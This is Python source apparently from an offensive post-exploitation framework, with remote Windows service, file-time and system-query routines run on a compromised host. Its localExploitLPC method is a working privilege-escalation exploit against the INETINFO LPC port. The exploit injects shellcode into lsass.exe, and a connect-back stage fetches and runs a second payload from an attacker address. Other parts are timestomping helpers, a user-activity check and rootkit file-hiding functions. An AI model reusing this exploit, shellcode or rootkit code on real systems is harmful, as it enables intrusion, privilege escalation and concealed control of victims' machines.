        #SERVICE_DRIVER Enumerates services of type SERVICE_KERNEL_DRIVER and SERVICE_FILE_SYSTEM_DRIVER.
        #SERVICE_WIN32 Enumerates services of type SERVICE_WIN32_OWN_PROCESS and SERVICE_WIN32_SHARE_PROCESS.
        vars["dwServiceType"]=dwServiceType
        vars["dwServiceState"]=dwServiceState
        vars["ResumeHandle"]=ResumeHandle


        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint() #error if ret==0

        if ret==0:
            val=self.readint() #services returned, or error code
        else:
            val=[]
            num=self.readint() #number of structures to read
            #print "num is %d"%num
            for i in range(0,num):
                name=self.readstring()
                displayname=self.readstring()
                state=self.readint()
                pid=self.readint()
                devlog("win32","% 5d   (%d)   [% 25s] %s" % (pid, state, name, displayname))
                val+=[(name,iso8859toascii(displayname),state,pid)]
        self.leave()
        return ret,val

    def CloseServiceHandle(self,handle):
        code="""
        #import "remote","advapi32.dll|CloseServiceHandle" as "CloseServiceHandle"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "hService" as "hService"

        void main()
        {
           int ret;
           ret=CloseServiceHandle(hService);
        }
        """


        vars={}
        vars["hService"]=handle

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
        return

    def DeleteService(self,handle):
        code="""
        #import "remote","advapi32.dll|DeleteService" as "DeleteService"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "hService" as "hService"

        void main()
        {
           int ret;
           int error;
           ret=DeleteService(hService);
           error=GetLastError();
           sendint(ret);
           if (ret == 0) {
              sendint(error);
           }
        }
        """


        vars={}
        vars["hService"]=handle

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            error=self.readint()
        else:
            error=0
        self.leave()
        return ret,error

    def ControlService(self, hService, dwControl):
        """
        Send control codes to a running service - used mainly to stop a
        running service. Need to have the SERVICE_USER_DEFINED_CONTROL (0x100)
        access right on the passed in handle to the service otherwise you will
        get an access denied error.
        """

        code="""
        #import "remote","advapi32.dll|ControlService" as "ControlService"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "hService" as "hService"
        #import "int", "dwControl" as "dwControl"

        struct SERVICE_STATUS {
        int dwServiceType;
        int dwCurrentState;
        int dwControlsAccepted;
        int dwWin32ExitCode;
        int dwServiceSpecificExitCode;
        int dwCheckPoint;
        int dwWaitHint;
        };

        void main()
        {
           int ret;
           int error;
           struct SERVICE_STATUS ServStatus;
           // Add arguments later
           ret=ControlService(hService,dwControl,&ServStatus);
           error=GetLastError();
           sendint(ret);
           //ret of zero indicates failure
           if (ret==0) {
             sendint(error);
            }
            else {
              sendint(ServStatus.dwCurrentState);
            }
        }
        """
        vars={}
        vars["hService"]=hService
        vars["dwControl"]=dwControl

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        ##Non zero return on success
        if ret==0:
            val=self.readint()
        else:
            val={}
            val["dwCurrentState"]=self.readint()
        self.leave()
        return ret,val

    #http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createservice.asp
    def CreateService(self,hSC,serviceName,displayName,access,serviceType,startType,errorControl,binaryName,startName=None,password=None,loadOrderGroup=0,tagid=None,dependancies=0):
        """
        On success returns a handle to the new service
        On failure, returns null
        """
        if tagid==None:
            tagid=0 #null pointer
        if password==None:
            password=0 #null pointer
        if startName == None:
            startName = 0 # null pointer

        code="""
        #import "remote","advapi32.dll|CreateServiceA" as "CreateServiceA"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "hService" as "hService"
        #import "string", "lpServiceName" as "lpServiceName"
        #import "string", "lpDisplayName" as "lpDisplayName"
        #import "int", "dwDesiredAccess" as "dwDesiredAccess"
        #import "int", "dwServiceType" as "dwServiceType"
        #import "int", "dwStartType" as "dwStartType"
        #import "int", "dwErrorControl" as "dwErrorControl"
        #import "string", "lpBinaryPathName" as "lpBinaryPathName"
        #import "int", "lpLoadOrderGroup" as "lpLoadOrderGroup"
        #import "int", "lpdwTagId" as "lpdwTagId"
        #import "int", "lpDependencies" as "lpDependencies"
        //really should be stringorint
        #import "string", "lpServiceStartName" as "lpServiceStartName"
        #import "string", "lpPassword" as "lpPassword"

        void main()
        {
           int ret;
           int error;
           // Add arguments later
           ret=CreateServiceA(hService,lpServiceName,lpDisplayName,dwDesiredAccess,dwServiceType,dwStartType,dwErrorControl,lpBinaryPathName,lpLoadOrderGroup,lpdwTagId,lpDependencies,lpServiceStartName,lpPassword);
           error=GetLastError();
           sendint(ret);
           //ret of zero indicates failure
           if (ret==0) {
             sendint(error);
            }
        }
        """
        vars={}
        vars["hService"]=hSC
        vars["lpServiceName"]= serviceName
        vars["lpDisplayName"]= displayName
        vars["dwDesiredAccess"]=access
        vars["dwServiceType"]= serviceType
        vars["dwStartType"]= startType
        vars["dwErrorControl"]= errorControl
        vars["lpBinaryPathName"]= binaryName
        vars["lpLoadOrderGroup"]= loadOrderGroup
        vars["lpdwTagId"]= tagid
        vars["lpDependencies"]= dependancies
        vars["lpServiceStartName"]= startName
        vars["lpPassword"]= password

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        ##Non zero return on success
        if ret==0:
            #error
            val=self.readint()
        else:
            val="No error"
        self.leave()
        return ret,val


    #####################################################################
    #End of Service Control Manager routines
    #####################################################################

    #####################################################################
    #Start of File Time routines
    #####################################################################

    def GetFileTime(self,fd):
        code="""
        #import "remote","kernel32.dll|GetFileTime" as "GetFileTime"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "fd" as "fd"

        struct FILETIME {
          int low;
          int high;
        };

        void main()
        {
           int ret;
           int error;
           struct FILETIME create;
           struct FILETIME access;
           struct FILETIME modify;

           ret=GetFileTime(fd,&create,&access,&modify);
           error=GetLastError();
           sendint(ret);
           if (ret == 0) {
              sendint(error);
           } else {
              sendint(create.low);
              sendint(create.high);
              sendint(access.low);
              sendint(access.high);
              sendint(modify.low);
              sendint(modify.high);
           }
        }
        """


        vars={}
        vars["fd"]=fd

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            error=self.readint()
            val=error
        else:
            create=(self.readint(),self.readint())
            access=(self.readint(),self.readint())
            modify=(self.readint(),self.readint())
            #Return a tuple of times, which are also tuples
            val=(create,access,modify)
        self.leave()
        return ret,val

    def SetFileTime(self,fd,times):
        """
        SetFileTime:
        FD is the fd to write to
        Times is a tuple of (Create,Access,Write)
        """
        code="""
        #import "remote","kernel32.dll|SetFileTime" as "SetFileTime"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "local", "readintfromself" as "readintfromself"
        #import "int", "fd" as "fd"

        struct FILETIME {
          int low;
          int high;
        };

        void main()
        {
           struct FILETIME create;
           struct FILETIME access;
           struct FILETIME modify;

           create.low=readintfromself();
           create.high=readintfromself();
           access.low=readintfromself();
           access.high=readintfromself();
           modify.low=readintfromself();
           modify.high=readintfromself();

           int ret;
           int error;
           ret=SetFileTime(fd,&create,&access,&modify);
           error=GetLastError();
           sendint(ret);
           if (ret == 0) {
              sendint(error);
           }
        }
        """


        vars={}
        vars["fd"]=fd

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        #send six integers to remote side as structure parts
        for atime in times:
            for half in atime:
                self.sendint(half)

        ret=self.readint()
        if ret==0:
            error=self.readint()
        else:
            error=0
        self.leave()
        return ret,error

    #####################################################################
    #End of File Time routines
    #####################################################################

    def localExploitLPC(self, args):
        import mosdef
        #import ntstatus

        NOTES="""
        SecurityQualityOfService = Specifies the impersonation level.

        NtConnectPort(
          OUT PHANDLE ClientPortHandle,
          IN PUNICODE_STRING ServerPortName,
          IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
          IN OUT PLPC_SECTION_OWNER_MEMORY ClientSharedMemory OPTIONAL,
          OUT PLPC_SECTION_MEMORY ServerSharedMemory OPTIONAL,
          OUT PULONG MaximumMessageLength OPTIONAL,
          IN OUT PVOID ConnectionInfo OPTIONAL,
          IN OUT PULONG ConnectionInfoLength OPTIONAL );

        """

        # the main idea is to overwrite the unhandled exception filter ptr
        # so the 2nd heap heckup causes a jmp to our payload, which then
        # runs our payload and then we exitprocess which will cause inetinfo to respawn

        # we inject into lsass.exe and directly exitprocess inetinfo
        # that way we make sure we don't run into any heap funkyness

        INJECT="""
        jmp start
        // junk pad to catch icky write
        nop
        nop
        nop
        nop
        nop
        nop
start:
        // small heap fix to tie us over just in case
        movl %fs:(0x30),%ecx
        leal 0x18(%ecx),%ebx
        movl 0x90(%ecx),%ecx
        leal 0x4(%ecx),%ecx
        movl (%ecx),%ecx
        movl %ecx,(%ebx)

        // overwrite unhandled exception filter with exitprocess so we dont get multiple runs
        // of payload accidently

        movl $SUEME,%eax
        movl 0x5(%eax),%eax
        movl $EXITPROCESS,(%eax)

        call pcloc
pcloc:
        popl %ebx

        movl $GETCURRENTPROCESSID,%eax
        call *%eax
        mov %eax,%esi

        pushl $0x40
        pushl $0x1000
        pushl $0x8004
        pushl $0
        movl $VIRTUALALLOC,%eax
        call *%eax

        movl %eax,%edi

        pushl %edi
        pushl $0x8000
        addl $4,%edi
        pushl %edi
        pushl $5
        movl $NTQUERYSYSTEMINFORMATION,%eax
        call *%eax

        // ptr = buffer + p->NextEntryDelta
        next_delta:
        addl (%edi),%edi
        // offset to ptr to UNICODE_STRING ProcessName is 0x38 + 4
        movl 0x3c(%edi),%esi
        movl $LSASSLEN,%ecx
        // cmp if len matches first, if not next delta
        xorl %edx,%edx
        movw 0x38(%edi),%dx
        cmpl %ecx,%edx
        jne next_delta
        // 3 nops loss :/
        leal lsassname-pcloc(%ebx),%edx
        next_byte:
        movb (%esi),%al
        cmpb %al,(%edx)
        jne next_delta
        incl %esi
        incl %edx
        decl %ecx
        jnz next_byte
        // found LSASS.EXE !
        movl 0x44(%edi),%edi

        openpid:

        pushl %edi
        pushl $0
        pushl $0x43a
        movl $OPENPROCESS,%eax
        call *%eax
        test %eax,%eax
        jz openpid

        pushl %edi

        // save handle
        movl %eax,%edi

        pushl $0x40

        pushl $0x1000

        pushl $CODESIZE
        pushl $0
        pushl %edi
        movl $VIRTUALALLOCEX,%eax
        call *%eax

        // save base
        pushl %eax

        writeout:

        pushl $0
        pushl $CODESIZE
        leal codemark-pcloc(%ebx),%esi
        pushl %esi
        pushl %eax
        pushl %edi
        movl $WRITEPROCESSMEMORY,%eax
        call *%eax
        test %eax,%eax
        jz writeout

        // get base
        popl %eax

        pushl $0
        pushl $0
        pushl $0
        pushl %eax
        pushl $0
        pushl $0
        pushl %edi
        movl $CREATEREMOTETHREAD,%eax
        call *%eax

        // invalid handle for some reason ? try again
        popl %edi

        test %eax,%eax
        // jz openpid
        // we just want to try once here, because sometimes createremotethread claims
        // to have failed in inetinfo, when it really hasn't...weird

        // exit process
        movl $EXITPROCESS,%eax
        call *%eax
"""

        CALLBACK="""
//        int3

        //call socket
        pushl $6
        pushl $1
        pushl $2
        cld
        movl $SOCKET,%eax
        call *%eax

        movl %eax,%esi
        leal 4(%esp),%edi
        movl $PORT,4(%esp)
        movl $IPADDRESS,8(%esp)
        push $0x10
        pushl %edi
        pushl %eax
        movl $CONNECT,%eax
        call *%eax
        test %eax,%eax
        jnz exit

        movl %esp,%edi
gogetlen:
        pushl $0
        push $4
        pushl %edi
        pushl %esi
        movl $RECV,%eax
        call *%eax
        cmpl $-1,%eax
        je exit

        movl (%edi),%eax
        subl %eax,%esp
        andl $-4,%esp
        movl %esp,%edi
gogotlen:
        pushl $0
        pushl %eax
        pushl %edi
        pushl %esi
        movl $RECV,%eax
        call *%eax
        cmpl $-1,%eax
        je exit
stagetwo:
        subl $0x1000,%esp
        jmp *%edi
exit:
        movl $EXITTHREAD,%eax
        call *%eax
"""

        vars={}

        # needed for CALLBACK
        self.getprocaddress("ws2_32.dll|socket")
        self.getprocaddress("ws2_32.dll|connect")
        self.getprocaddress("ws2_32.dll|recv")
        self.getprocaddress("kernel32.dll|ExitThread")

        CALLBACK = CALLBACK.replace("SOCKET", uint32fmt(self.remotefunctioncache["ws2_32.dll|socket"]))
        CALLBACK = CALLBACK.replace("CONNECT", uint32fmt(self.remotefunctioncache["ws2_32.dll|connect"]))
        CALLBACK = CALLBACK.replace("RECV", uint32fmt(self.remotefunctioncache["ws2_32.dll|recv"]))
        CALLBACK = CALLBACK.replace("EXITTHREAD", uint32fmt(self.remotefunctioncache["kernel32.dll|ExitThread"]))

        if "ipaddress" not in args:
            logging.debug("No ipaddress passed to tcpconnect!!!")
        if "port" not in args:
            logging.debug("no port in args of tcpconnect!!!")

        logging.debug("LocalLPC callback set to: %s:%d" % (args["ipaddress"], args["port"]))

        ipaddress=socket.inet_aton(socket.gethostbyname(args["ipaddress"]))
        port=int(args["port"])

        CALLBACK = CALLBACK.replace("IPADDRESS", uint32fmt(istr2int(ipaddress)))
        CALLBACK = CALLBACK.replace("PORT", uint32fmt(reverseword((0x02000000|port))))

        injectme = mosdef.assemble(CALLBACK, "X86")

        # needed for INJECT

        self.getprocaddress("kernel32.dll|SetUnhandledExceptionFilter")
        self.getprocaddress("kernel32.dll|ExitProcess")
        self.getprocaddress("kernel32.dll|GetCurrentProcessId")
        self.getprocaddress("kernel32.dll|OpenProcess")
        self.getprocaddress("kernel32.dll|VirtualAllocEx")
        self.getprocaddress("kernel32.dll|WriteProcessMemory")
        self.getprocaddress("kernel32.dll|CreateRemoteThread")
        self.getprocaddress("kernel32.dll|VirtualAlloc")
        self.getprocaddress("ntdll.dll|NtQuerySystemInformation")

        INJECT = INJECT.replace("SUEME", uint32fmt(self.remotefunctioncache["kernel32.dll|SetUnhandledExceptionFilter"]))
        INJECT = INJECT.replace("EXITPROCESS", uint32fmt(self.remotefunctioncache["kernel32.dll|ExitProcess"]))

        INJECT = INJECT.replace("GETCURRENTPROCESSID", uint32fmt(self.remotefunctioncache["kernel32.dll|GetCurrentProcessId"]))
        INJECT = INJECT.replace("OPENPROCESS", uint32fmt(self.remotefunctioncache["kernel32.dll|OpenProcess"]))
        INJECT = INJECT.replace("VIRTUALALLOCEX", uint32fmt(self.remotefunctioncache["kernel32.dll|VirtualAllocEx"]))
        INJECT = INJECT.replace("WRITEPROCESSMEMORY", uint32fmt(self.remotefunctioncache["kernel32.dll|WriteProcessMemory"]))
        INJECT = INJECT.replace("CREATEREMOTETHREAD", uint32fmt(self.remotefunctioncache["kernel32.dll|CreateRemoteThread"]))
        INJECT = INJECT.replace("VIRTUALALLOC", uint32fmt(self.remotefunctioncache["kernel32.dll|VirtualAlloc"]))
        INJECT = INJECT.replace("NTQUERYSYSTEMINFORMATION", uint32fmt(self.remotefunctioncache["ntdll.dll|NtQuerySystemInformation"]))

        INJECT = INJECT.replace("CODESIZE", "0x%x"%uint32(len(injectme)))
        import urllib
        INJECT += "codemark:\n.urlencoded \"%s\"\ncodemarkend:\n"%urllib.quote(injectme)
        # slap on LSASS.EXE as a MS UNICODE string
        lsassname = msunistring("LSASS.EXE")
        INJECT += "lsassname:\n.urlencoded \"%s\"\n"%urllib.quote(lsassname)
        # -2 to compensate for nul termination (2 bytes widechar)
        INJECT = INJECT.replace("LSASSLEN", "0x%x"%(len(lsassname)-2))

        # compile payload
        PAYLOAD = mosdef.assemble(INJECT, "X86")

        # revert to self
        self.SetThreadToken(0)

        unicode_string = msunistring("\\RPC Control\\INETINFO_LPC")
        vars["LPCSTRING"] = unicode_string
        vars["PAYLOAD"] = PAYLOAD

        code="""
        #import "remote", "kernel32.dll|CreateFileMappingA" as "CreateFileMapping"
        #import "remote", "ntdll.dll|NtConnectPort" as "NtConnectPort"
        #import "remote", "kernel32.dll|SetUnhandledExceptionFilter" as "SetUnhandledExceptionFilter"

        #import "local", "sendstring" as "sendstring"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"
        #import "local", "memcpy" as "memcpy"
        #import "local", "debug" as "debug"

        #import "string", "LPCSTRING" as "LPCSTRING"
        #import "string", "PAYLOAD" as "PAYLOAD"

        struct UNICODESTRING {
          short len;
          short max_len;
          char * ustr;
        };

        struct LPCSECTIONMAPINFO {
          int Length;
          int SectionSize;
          int ServerBaseAddress;
        };

        struct LPCSECTIONINFO {
          int Length;
          int SectionHandle;
          int Param1;
          int SectionSize;
          int ClientBaseAddress;
          int ServerBaseAddress;
        };

        // we use a nulled out QOS struct to prevent impersonation whining
        struct SECURITY_QUALITY_OF_SERVICE {
          int Length;
          int mpersonationLevel;
          int ContextTrackingMode;
          int EffectiveOnly;
        };

        void main() {
          int ret;
          int i;

          int hP;

          char *lpcstring;
          char *payload;

          int hFileMap;

          char lpcstringAligned[UNILEN];

          char connectBuf[260];
          int connectbuf_size;

          char * ptr;
          int * int_ptr;

          struct SECURITY_QUALITY_OF_SERVICE qos;
          struct LPCSECTIONINFO sectionInfo;
          struct LPCSECTIONMAPINFO mapInfo;
          struct UNICODESTRING unistruct;

          // globals
          payload = PAYLOAD;
          lpcstring = LPCSTRING;
          // slap our global into a local so that heezy is aligned
          memcpy(lpcstringAligned, lpcstring, UNILEN);
          lpcstring = lpcstringAligned;

          connectbuf_size = 260;

          memset(&qos,0,16); // psecurity quality of service
          memset(&sectionInfo, 0, 24);
          memset(&mapInfo, 0, 12);

          // debug();
          hFileMap = CreateFileMapping(-1, 0, 4, 0, 0x10000, 0);
          sectionInfo.Length = 0x18;
          sectionInfo.SectionHandle = hFileMap;
          sectionInfo.SectionSize = 0x10000;
          mapInfo.Length = 0x0c;

          memset(connectBuf, 0x58, 260);
          memset(connectBuf, 0x00, 54);

          ptr = SUEME;
          connectBuf[244] = ptr[5];
          connectBuf[245] = ptr[6];
          connectBuf[246] = ptr[7];
          connectBuf[247] = ptr[8];

          unistruct.len = UNILEN;
          unistruct.max_len = UNILEN+2;
          unistruct.ustr = lpcstring;

          // debug();

          ret = NtConnectPort(&hP, &unistruct, &qos, &sectionInfo, &mapInfo, 0, connectBuf, &connectbuf_size);

          if (ret) {
              sendint(-1);
              return;
          }

          // set unlink to overwrite the Unhandled Exception Filter with the shared memory pointer

          // do a MOSDEF compatible cast
          ptr = connectBuf + 240;
          int_ptr = ptr;
          *int_ptr = sectionInfo.ServerBaseAddress;

          // debug();

          // copy over the payload to the shared section
          ptr = sectionInfo.ClientBaseAddress;
          memcpy(ptr, payload, PAYLOADLEN);

          i = 0;
          while (i < 0x150)
          {
              ret = NtConnectPort(&hP, &unistruct, &qos, 0, 0, 0, connectBuf, &connectbuf_size);
              i = i+1;
              if (ret) {
                  sendint(ret);
                  return;
              }
          }
          ret=0;
          sendint(ret);
          return;
        }
        """
        code = code.replace("PAYLOADLEN", "%d"%len(vars["PAYLOAD"]))
        code = code.replace("UNILEN", "%d"%(len(unicode_string)-2))
        code = code.replace("SUEME", uint32fmt(self.remotefunctioncache["kernel32.dll|SetUnhandledExceptionFilter"]))
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        self.leave()
        # do ntstatus
        #if ret:
        #    try:
        #        print "NTSTATUS: %s"%ntstatus.reverseNTS[uint32(ret)]
        #    except:
        #        print "NTSTATUS %.8X NOT FOUND"%uint32(ret)
        return ret


    def gethostbyname(self, hostname, parse=True):
        """
        Returns <value>, success
        """
        #clear off \n and null terminaters first
        hostname=hostname.strip()
        if not hostname:
            return 0,""

        if hostname[-1]=="\x00":
            hostname=hostname[:-1]

        if not hostname[0].isalpha():
            #you sent us an IP Address!
            devlog("win32", "[!] got an IP address for gethostbyname")
            return 1,[hostname]
        else:
            #is a hostname
            code="""
            #import "remote","ws2_32.dll|gethostbyname" as "gethostbyname"
            #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

            #import "local", "sendint" as "sendint"
            #import "string", "hostname" as "hostname"

            struct hostent {
            char * h_name;
            char **aliases;
            short h_addrtype;
            short h_length;
            char **h_addr_list;
            };
            //h_addr_list is a null terminated list of addresses for the host in network
            //byte order

            void main()
            {
               int i;
               int ret;
               int error;
               int * p;
               struct hostent * remoteHost;
               remoteHost=gethostbyname(hostname);
               error=GetLastError();
               sendint(remoteHost);
               //ret of zero indicates failure
               if (remoteHost==0) {
                 sendint(error);
                }
                else {
                  p=remoteHost->h_addr_list;
                  p=*p;
                  ret=*p; //haddr[0] is the first address
                  i=0; //count of host many addresses we've sent
                  //maximum of 8 addresses, although MSDN doesn't mention this
                  while (i<8 && ret!=0) {
                     sendint(ret);
                     p=p+1; //advance p += 4 bytes
                     ret=*p; //ret is the next address
                     i=i+1;
                  }
                  sendint(0);
                }
            }
            """
        vars={}
        vars["hostname"]=hostname

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        #print "Got %x as return value from gethostbyname"%ret
        ##Non zero return on success
        error=0
        if ret==0:
            error=self.readint()
            devlog("win32","GetLastError returned %x for gethostbyname"%error)
        else:
            #read until there are no more addresses left
            #and put them in our val array
            val=[]
            addr=self.readint()
            while addr!=0:
                logging.debug("Got addr: %x" % addr)
                #these integers are backwards for some reason
                #so we use intel_order rather than big_order to reverse them
                if parse:
                    val += [socket.inet_ntoa(intel_order(addr))]
                else:
                    val += [addr]

                addr=self.readint()
        self.leave()
        if ret==0:
            return ret, error
        return ret, val

    def GetVersionEx(self):
        code = """
        #import "remote", "kernel32.dll|GetVersionExA" as "GetVersionExA"
        #import "local", "sendint" as "sendint"
        #import "local", "sendshort" as "sendshort"
        #import "local", "sendstring" as "sendstring"
        #import "local", "memset" as "memset"

        struct OSVERSIONINFOEX {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            char szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            //it's possible there's 2 characters here, for padding? I hope not.
            char wProductType;
            char wReserved;
            int pad; //dunno why this is here. But it is.
        };

        void main()
        {
           int ret;
           int error;
           int size;
           struct OSVERSIONINFOEX osvi;
           size = 156; // sizeof(osversioninfoex) + 4 (for whatever reason)
           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;

           ret = GetVersionExA(&osvi);
           //error = GetLastError();
           sendint(ret);
           if (ret != 0) {
               // success
               sendint(osvi.dwPlatformId);
               sendint(osvi.dwMajorVersion);
               sendint(osvi.dwMinorVersion);
               sendshort(osvi.wServicePackMajor);
               sendshort(osvi.wServicePackMinor);
               sendstring(osvi.szCSDVersion);
               sendint(osvi.wProductType);
           }
        }
        """
        lvars = {}
        self.clearfunctioncache()
        request = self.compile(code, lvars)
        self.sendrequest(request)
        ret = self.readint()
        if ret == 0:
            self.log("Could not get version information")
            val = None
            ret = 0
            # val = self.readint() #error if ret!=0, else status
        else:
            val = {}
            val["PlatformID"] = self.readint()
            val["Major Version"] = self.readint()
            val["Minor Version"] = self.readint()
            val["SP Major Version"] = self.readshort()
            val["SP Minor Version"] = self.readshort()
            val["SP string"] = self.readstring()
            val["Product Type"] = self.readint()
            # print "val: %s"%val
        self.leave()
        return ret, val

    def VerifyVersionInfo(self, major, minor):
        code = """
        #import "remote", "kernel32.dll|VerifyVersionInfoA" as "VerifyVersionInfoA"
        #import "remote", "kernel32.dll|VerSetConditionMask" as "VerSetConditionMask"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "int", "major" as "major"
        #import "int", "minor" as "minor"


        #define VER_MINORVERSION        0x0000001
        #define VER_MAJORVERSION        0x0000002
        #define VER_PLATFORMID          0x0000008
        #define VER_SERVICEPACKMINOR    0x0000010
        #define VER_SERVICEPACKMAJOR    0x0000020

        #define VER_EQUAL               0x1
        #define VER_GREATER_EQUAL       0x3

        struct OSVERSIONINFOEX {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            char szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            // it's possible there's 2 characters here, for padding? I hope not.
            char wProductType;
            char wReserved;
            int pad; //dunno why this is here. But it is.
        };

        void main()
        {
           int ret;
           int error;
           int size;
           struct OSVERSIONINFOEX osvi;
           size = 156; // sizeof(osversioninfoex) + 4 (for whatever reason)

           int op;
           op = VER_MAJORVERSION | VER_MINORVERSION;

           // dwlConditionMask is a 64bit integer
           long dwlConditionMask;
           long pad;
           dwlConditionMask = 0;
           pad = 0;

           VerSetConditionMask(dwlConditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
           VerSetConditionMask(dwlConditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);

           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;
           osvi.dwMajorVersion = major;
           osvi.dwMinorVersion = minor;

           ret = VerifyVersionInfoA(&osvi, op, dwlConditionMask);
           sendint(ret);
           if (ret == 0) {
               error = GetLastError();
               sendint(error);
           }
        }
        """

        lvars = {}
        lvars["major"] = major
        lvars["minor"] = minor

        self.clearfunctioncache()
        request = self.compile(code, lvars)
        self.sendrequest(request)
        ret = self.readint()
        error = 0

        if ret == 0:
            error = self.readint()
            if error != 0x47e and error != 0: # ERROR_OLD_WIN_VERSION
                logging.error("VerifyVersionInfo failed (%d)" % error)

        self.leave()

        return ret

    def get_all_memory(self, addy):
        """
        Gets all memory as one large block until we can't read any more
        """
        code="""
        #import "remote", "kernel32.dll|IsBadReadPtr" as "IsBadReadPtr"
        #import "local", "sendint" as "sendint"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "addy" as "addy"
        #import "local", "memcpy" as "memcpy"

        void main()
        {
           int ret;
           int start;
           int size;
           int sendsize;
           int current;
           char buf[1000];
           char *p;

           start=addy;
           size=0;
           ret=1;
           ret=IsBadReadPtr(start,size);
           while (ret==0) {
              size=size+1;
              ret=IsBadReadPtr(start,size);
           }
           if (size!=0) {
              size=size-1; //off by one fix
            }
           sendint(size);
           current=0;
           p=start;
           while (current<size) {
              sendsize=size-current;
              if (sendsize>1000) {
                 sendsize=1000;
              }

              memcpy(buf,p,sendsize);
              writeblock2self(buf,sendsize);
              current=current+sendsize;
              p=p+sendsize;
           }

        }
        """

        vars={}
        vars["addy"]=addy
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        logging.debug("Reading %x bytes starting at %x" % (ret, addy))
        buf=self.readbuf(ret)
        self.leave()
        return buf

    def rename_file( self, old_file, new_file ):
        """
        Renames a file on the remote host.
        """
        vars = {}
        vars["old_file"]  = old_file
        vars["new_file"]  = new_file

        code = """
        #import "remote", "msvcrt.dll|rename" as "rename"
        #import "local", "sendint" as "sendint"

        #import "string", "old_file" as "old_file"
        #import "string", "new_file" as "new_file"

        void main()
        {
          int ret;

          ret = rename( old_file, new_file );

          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        self.leave()

        if ret == 0:
            self.log("Successfully renamed %s to %s" % ( old_file, new_file ) )
            ret = 1
        else:
            self.log("Failed to rename %s to %s" % ( old_file, new_file ) )
            ret = -1

        return ret


    def GetUserActive(self):
        """
        Returns time in milliseconds since user was last active.

        1 if we can detect that a user is active on the machine,
        0 otherwise.
        """
        #check for 95/98/ME/NT 4.0
        if not self.getprocaddress_withmalloc("user32.dll|GetLastInputInfo"):
            self.log("We are not running on a system that supports GetLastInputInfo - unable to determine user activity")
            return None

        #otherwise we were 2k or above
        code="""
        #import "remote", "user32.dll|GetLastInputInfo" as "GetLastInputInfo"
        #import "remote", "kernel32.dll|GetTickCount" as "GetTickCount"
        #import "local", "sendint" as "sendint"

        struct LASTINPUTINFO {
          int cbSize;
          int dwTime;
        };

        void main()
        {
           int ret;
           int tickcount;
           struct LASTINPUTINFO lastinput;
           lastinput.cbSize = 8; //sizeof(LASTINPUTINFO)
           ret=GetLastInputInfo(&lastinput);
           sendint(ret);
           if (ret==0) {
              //failed to run function
              return; //done
           }
          //ran function ok...now sending data
           sendint(lastinput.dwTime);
           tickcount=GetTickCount();
           sendint(tickcount);
        }
        """

        vars={}
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret:
            #gather time information
            dwTime=self.readint()
            tickcount=self.readint()
            self.leave() #done with all input
            self.log("Got tickcount %x and dwTime as %x"%(tickcount,dwTime))
            return tickcount-dwTime
        else:
            self.leave() #done with all input
            self.log("failed to determine if user was active or not, so assuming not...")
            return None
        return ret #never reached

    def update_rootkit_filelist( self, update_msg ):
        """
        Updates the file list on the rootkitted target.
        """
        vars = {}
        vars["update_msg"] = update_msg

        code = """
        #import "remote", "msvcrt.dll|fopen" as "fopen"
        #import "remote", "msvcrt.dll|fputs" as "fputs"
        #import "remote", "msvcrt.dll|fclose" as "fclose"

        #import "local", "sendint" as "sendint"
        #import "string", "update_msg" as "update_msg"

        void main()
        {
          int fd;
          int ret;

          fd = fopen("C:\\mosdef.hidden.files", "a");
          if(fd != NULL)
          {
            ret = fputs(update_msg, fd);
            fclose( fd );
            sendint(ret);
            return;
          }

          sendint(-1);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()

        return ret



    def rootkit_present( self ):
        """
        Tests whether it can obtain a handle to the rootkit.
        Updates node.capabilities if it can.
